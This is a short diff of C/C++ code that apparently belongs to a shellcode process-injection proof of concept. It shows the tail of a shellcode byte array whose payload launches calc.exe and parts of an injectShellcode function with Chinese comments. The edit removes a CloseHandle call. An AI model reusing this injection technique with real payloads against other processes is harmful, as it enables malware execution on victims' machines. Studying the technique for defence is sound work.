@@ -27,6 +27,7 @@ unsigned char buf[] =
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
+
 bool injectShellcode(DWORD Target) {
 
     //获取目标进程句柄
@@ -70,7 +71,7 @@ bool injectShellcode(DWORD Target) {
     // 注意：如果Shellcode需要长时间运行或修改内存，则不应立即释放。
     VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
     CloseHandle(hThread);
-    CloseHandle(hProcess);
+
     return TRUE;
 }
 
